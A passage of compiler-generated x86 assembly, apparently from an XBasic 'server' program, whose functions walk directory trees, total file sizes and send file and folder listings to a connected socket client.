	jmp	end.func11.server			;;; i258
;
; [3314] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.replace.server:  ;;; Function end label for Assembly Programmers.
end.func11.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  replace ()  *****
;  *****
;
; [3316] FUNCTION STRING GetDirSize (socket,STRING dir)
.code
;
#ifdef GetDirSize.socket
#undef GetDirSize.socket
#endif
#define GetDirSize.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef GetDirSize.dir
#undef GetDirSize.dir
#endif
#define GetDirSize.dir ebp+12	; exposes function argument 'dir'
;
align 16
_GetDirSize.server@8:
;  *****
;  *****  FUNCTION  GetDirSize ()  *****
;  *****
func76.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func76.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.496:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.496			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
funcBody76.server:
;
; [3317] SHARED totalfolders,totalfiles
data section 'globals$shared'
align	4
%totalfolders.server:	db 4 dup ?
.code
data section 'globals$shared'
align	4
%totalfiles.server:	db 4 dup ?
.code
;
; [3318] SHARED GIANT tdirsize
data section 'globals$shared'
align	8
%tdirsize.server:	db 8 dup ?
.code
;
; [3319] STRING value
#ifdef GetDirSize.value
#undef GetDirSize.value
#endif
#define GetDirSize.value ebp-40	; exposes local variable 'value'
;
;
; [3322] IF WaitForSingleObject (#hsmGetDirSize,10000) == $$WAIT_TIMEOUT THEN
	push	10000			;;; i656a
	push	[%#hsmGetDirSize.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0147.server			;;; i219
;
; [3323] RETURN "0"
	mov	eax,addr @_string.062E.server			;;; i663
	call	%_clone.a0			;;; i870
	jmp	end.func76.server			;;; i258
;
; [3324] END IF
else.0147.server:
end.if.0147.server:
;
; [3326] IFZ dir THEN RETURN "0"
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.493			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0148.server			;;; i192
A.493:
	mov	eax,addr @_string.062E.server			;;; i663
	call	%_clone.a0			;;; i870
	jmp	end.func76.server			;;; i258
else.0148.server:
end.if.0148.server:
;
; [3327] totalfolders = 0
	mov	eax,0			;;; i659
	mov	d[%totalfolders.server],eax			;;; i668
;
; [3328] totalfiles = 0
	mov	eax,0			;;; i659
	mov	d[%totalfiles.server],eax			;;; i668
;
; [3329] tdirsize = 0
	mov	eax,0			;;; i659
	mov	edx,eax			;;; i406
	sar	edx,31			;;; i407
	mov	d[%tdirsize.server],eax			;;; i668
	mov	d[%tdirsize.server+4],edx
;
; [3331] FindAllInFolder (socket,"DIR",$$Tree_DirSize | $$Tree_Recursive,dir)
	mov	eax,addr @_string.03BD.server			;;; i663
	call	%_clone.a0			;;; i634
; .xstk76.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	mov	eax,8			;;; i659
	or	eax,4			;;; i763
; .xstk76.0001 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-56]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func75.server			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
;
; [3332] value = STRING$(tdirsize)+" "+STRING$(totalfolders-1)+" "+STRING$(totalfiles)
	sub	esp,64			;;; i487
	mov	eax,d[%tdirsize.server]			;;; i663a
	mov	edx,d[%tdirsize.server+4]
	mov	d[esp],eax			;;; i885
	mov	d[esp+4],edx			;;; i886
	call	%_string.giant			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-48],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[%totalfolders.server]			;;; i663a
	sub	eax,1			;;; i791
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-48]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-48],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[%totalfiles.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-48]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3333] ReleaseSemaphore (#hsmGetDirSize,1,NULL)
#ifdef GetDirSize.NULL
#undef GetDirSize.NULL
#endif
#define GetDirSize.NULL ebp-60	; exposes local variable 'NULL'
;
	push	[ebp-60]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmGetDirSize.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [3335] RETURN value
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func76.server			;;; i258
;
; [3336] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetDirSize.server:  ;;; Function end label for Assembly Programmers.
end.func76.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func76.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func76.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetDirSize ()  *****
;  *****
;
; [3338] FUNCTION GetAllFilesInDir (socket,STRING msg,STRING dir)
.code
;
#ifdef GetAllFilesInDir.socket
#undef GetAllFilesInDir.socket
#endif
#define GetAllFilesInDir.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef GetAllFilesInDir.msg
#undef GetAllFilesInDir.msg
#endif
#define GetAllFilesInDir.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef GetAllFilesInDir.dir
#undef GetAllFilesInDir.dir
#endif
#define GetAllFilesInDir.dir ebp+16	; exposes function argument 'dir'
;
align 16
_GetAllFilesInDir.server@12:
;  *****
;  *****  FUNCTION  GetAllFilesInDir ()  *****
;  *****
func74.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody74.server:
;
; [3339] SHARED totalfolders,totalfiles
;
; [3342] IFZ dir THEN RETURN $$FALSE
	mov	eax,[ebp+16]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.497			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0149.server			;;; i192
A.497:
	mov	eax,0			;;; i659
	jmp	end.func74.server			;;; i258
else.0149.server:
end.if.0149.server:
;
; [3344] totalfolders = 0
	mov	eax,0			;;; i659
	mov	d[%totalfolders.server],eax			;;; i668
;
; [3345] totalfiles = 0
	mov	eax,0			;;; i659
	mov	d[%totalfiles.server],eax			;;; i668
;
; [3346] FindAllInFolder (socket,msg,$$Tree_Dir,dir)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk74.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+16]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	1			;;; i656a
	push	[ebp-44]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func75.server			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
;
; [3347] FindAllInFolder (socket,msg,$$Tree_File,dir)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+16]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	2			;;; i656a
	push	[ebp-44]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func75.server			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
;
; [3349] GetTokenEx(@dir,32,0)' remove id string
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+16]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+16],ecx			;;; i670
	mov	esi,eax			;;; i33
	call	%____free			;;; i34
;
; [3350] SendMsg (socket,"CMSG "+dir+" "+STRING$(totalfiles)+" files  "+STRING$(totalfolders)+" folders")
	mov	eax,addr @_string.0452.server			;;; i663
	mov	ebx,[ebp+16]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-44],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[%totalfiles.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-44]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0635.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-44],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[%totalfolders.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-44]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0636.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [3352] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func74.server			;;; i258
;
; [3353] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetAllFilesInDir.server:  ;;; Function end label for Assembly Programmers.
end.func74.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetAllFilesInDir ()  *****
;  *****
;
; [3355] FUNCTION FindAllInFolder (socket,STRING msg,mode,STRING location)
.code
;
#ifdef FindAllInFolder.socket
#undef FindAllInFolder.socket
#endif
#define FindAllInFolder.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef FindAllInFolder.msg
#undef FindAllInFolder.msg
#endif
#define FindAllInFolder.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef FindAllInFolder.mode
#undef FindAllInFolder.mode
#endif
#define FindAllInFolder.mode ebp+16	; exposes function argument 'mode'
;
;
#ifdef FindAllInFolder.location
#undef FindAllInFolder.location
#endif
#define FindAllInFolder.location ebp+20	; exposes function argument 'location'
;
align 16
_FindAllInFolder.server@16:
;  *****
;  *****  FUNCTION  FindAllInFolder ()  *****
;  *****
func75.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func75.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.506:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.506			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,160			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,10				;;; ..
	xor	eax,eax			;;; ...
A.507:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.507			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+320]			;;; i125a
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-56],ebx			;;; i670
funcBody75.server:
;
; [3356] WIN32_FIND_DATA wfd
; .composites = ebp-40	; internal variable
#ifdef FindAllInFolder.wfd
#undef FindAllInFolder.wfd
#endif
#define FindAllInFolder.wfd ebp-44	; exposes local variable 'wfd'
;
;
; [3357] STRING folder,path
#ifdef FindAllInFolder.folder
#undef FindAllInFolder.folder
#endif
#define FindAllInFolder.folder ebp-48	; exposes local variable 'folder'
;
#ifdef FindAllInFolder.path
#undef FindAllInFolder.path
#endif
#define FindAllInFolder.path ebp-52	; exposes local variable 'path'
;
;
; [3358] SHARED totalfolders,totalfiles
;
; [3359] SHARED CONNECTED
;
; [3360] FSIZE fsize
#ifdef FindAllInFolder.fsize
#undef FindAllInFolder.fsize
#endif
#define FindAllInFolder.fsize ebp-56	; exposes local variable 'fsize'
;
;
; [3361] SHARED GIANT tdirsize
;
; [3364] id$ = GetTokenEx (@location,32,0)
#ifdef FindAllInFolder.id$
#undef FindAllInFolder.id$
#endif
#define FindAllInFolder.id$ ebp-60	; exposes local variable 'id$'
;
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+20]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+20],ecx			;;; i670
	lea	ebx,[ebp-60]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3365] DecomposePathname (location, @path,"","", "","")
	mov	eax,d[ebp+20]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk75.0000 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	push	0			;;; i665a
	push	0			;;; i665a
	push	0			;;; i665a
	push	0			;;; i665a
	push	[ebp-52]			;;; i674a
	push	[ebp-68]			;;; i674a
	call	func60.server			;;; i619
	sub	esp,24			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	add	esp,24			;;; i633
;
; [3366] location = location + "*"
	mov	eax,[ebp+20]			;;; i665
	mov	ebx,addr @_string.0644.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+20]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3368] hWFD = FindFirstFileA (&location, &wfd)
#ifdef FindAllInFolder.hWFD
#undef FindAllInFolder.hWFD
#endif
#define FindAllInFolder.hWFD ebp-72	; exposes local variable 'hWFD'
;
	mov	eax,d[ebp+20]			;;; i642
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-68]			;;; i674a
	call	_FindFirstFileA@8			;;; i619
	mov	d[ebp-72],eax			;;; i670
;
; [3369] IF (hWFD == $$INVALID_HANDLE_VALUE) THEN RETURN $$FALSE
	mov	eax,d[ebp-72]			;;; i665
	cmp	eax,-1			;;; i684a
	jne	>> else.014A.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func75.server			;;; i258
else.014A.server:
end.if.014A.server:
;
; [3370] DO
align 8
do.014B.server:
;
; [3371] IF (wfd.cFileName != ".") && (wfd.cFileName != "..") THEN
	mov	eax,d[ebp-44]			;;; i665
	lea	esi,[eax+44]			;;; i308
	mov	edi,260			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	ebx,addr @_string.02C5.server			;;; i663
	call	%_string.compare.sv			;;; i690
;>peep
	mov	eax,0			;;; i466
	je	> A.501			;;; i467
	not	eax			;;; i468
A.501:
;+peep
	mov	ebx,d[ebp-44]			;;; i665
	lea	esi,[ebx+44]			;;; i308
	mov	edi,260			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	ebx,esi			;;; i312
	mov	d[ebp-68],eax			;;; i670
	mov	eax,addr @_string.0647.server			;;; i663
	call	%_string.compare.vs			;;; i690
;>peep
	mov	eax,0			;;; i466
	je	> A.502			;;; i467
	not	eax			;;; i468
A.502:
;+peep
	mov	ebx,d[ebp-68]			;;; i665
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i220
	jz	>> else.014C.server			;;; i221
;
; [3372] IF (wfd.dwFileAttributes & $$FILE_ATTRIBUTE_DIRECTORY) THEN
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax]			;;; i313b
	and	eax,16			;;; i769
	test	eax,eax			;;; i220
	jz	>> else.014D.server			;;; i221
;
; [3373] INC totalfolders
	inc	d[%totalfolders.server]			;;; i85
;
; [3374] IF (mode & $$Tree_Dir) THEN
	mov	eax,d[ebp+16]			;;; i665
	and	eax,1			;;; i769
	test	eax,eax			;;; i220
	jz	>> else.014E.server			;;; i221
;
; [3375] SendMsg (socket,msg+" "+id$+" "+CSTRING$(&wfd.cFileName)+"\\")
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-60]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-68],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	lea	eax,[eax+44]			;;; i636
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,[ebp-68]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02CD.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [3376] END IF
else.014E.server:
end.if.014E.server:
;
; [3377] IF (mode & $$Tree_Recursive) THEN
	mov	eax,d[ebp+16]			;;; i665
	and	eax,4			;;; i769
	test	eax,eax			;;; i220
	jz	>> else.014F.server			;;; i221
;
; [3378] FindAllInFolder (socket,msg,mode,id$+" "+path+"\\"+CSTRING$(&wfd.cFileName)+"\\")
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,[ebp-60]			;;; i665
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-52]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02CD.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk75.0001 = ebp-80	; internal variable
	mov	[ebp-80],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	lea	eax,[eax+44]			;;; i636
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,[ebp-80]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02CD.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+16]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func75.server			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
;
; [3379] END IF
else.014F.server:
end.if.014F.server:
;
; [3380] ELSE
	jmp	end.if.014D.server			;;; i107
else.014D.server:
;
; [3381] INC totalfiles
	inc	d[%totalfiles.server]			;;; i85
;
; [3382] IF (mode & $$Tree_File) THEN
	mov	eax,d[ebp+16]			;;; i665
	and	eax,2			;;; i769
	test	eax,eax			;;; i220
	jz	>> else.0150.server			;;; i221
;
; [3383] SendMsg (socket,msg+" "+id$+" "+CSTRING$(&wfd.cFileName))
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-60]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-68],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	lea	eax,[eax+44]			;;; i636
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,[ebp-68]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [3384] END IF
else.0150.server:
end.if.0150.server:
;
; [3385] IF (mode & $$Tree_DirSize) THEN
	mov	eax,d[ebp+16]			;;; i665
	and	eax,8			;;; i769
	test	eax,eax			;;; i220
	jz	>> else.0151.server			;;; i221
;
; [3386] fsize.sizeh = wfd.nFileSizeHigh
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+28]			;;; i313b
	mov	ebx,d[ebp-56]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [3387] fsize.sizel = wfd.nFileSizeLow
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+32]			;;; i313b
	mov	ebx,d[ebp-56]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [3388] tdirsize = tdirsize + fsize.tsize
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[eax+4]
	mov	eax,d[eax]			;;; i313b
	mov	ebx,d[%tdirsize.server]			;;; i663a
	mov	ecx,d[%tdirsize.server+4]
	add	eax,ebx			;;; i776
	adc	edx,ecx			;;; i777
	into				;;; i778
	mov	d[%tdirsize.server],eax			;;; i668
	mov	d[%tdirsize.server+4],edx
;
; [3389] END IF
else.0151.server:
end.if.0151.server:
;
; [3390] END IF
end.if.014D.server:
;
; [3391] END IF
else.014C.server:
end.if.014C.server:
;
; [3392] LOOP WHILE (FindNextFileA (hWFD, &wfd)) && (CONNECTED == $$TRUE)
do.loop.014B.server:
;
; [0] EXTERNAL FUNCTION FindNextFileA (hFindFile, lpFindFileData)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-72]			;;; i674a
	call	_FindNextFileA@8			;;; i619
	mov	ebx,d[%CONNECTED.server]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.503			;;; i467
	not	ebx			;;; i468
A.503:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i194
	jnz	< do.014B.server			;;; i195
end.do.014B.server:
;
; [3394] FindClose (hWFD)
	push	[ebp-72]			;;; i674a
	call	_FindClose@4			;;; i619
;
; [3395] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func75.server			;;; i258
;
; [3396] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.FindAllInFolder.server:  ;;; Function end label for Assembly Programmers.
end.func75.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func75.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
free.func75.server:
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-60]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  FindAllInFolder ()  *****
;  *****
;
; [3398] FUNCTION STRING textRemove (STRING text,chars,offset)
.code
;
#ifdef textRemove.text
#undef textRemove.text
#endif
#define textRemove.text ebp+8	; exposes function argument 'text'
;
;
#ifdef textRemove.chars
#undef textRemove.chars
#endif
#define textRemove.chars ebp+12	; exposes function argument 'chars'
;
;
#ifdef textRemove.offset
#undef textRemove.offset
#endif
#define textRemove.offset ebp+16	; exposes function argument 'offset'
;
align 16
_textRemove.server@12:
;  *****
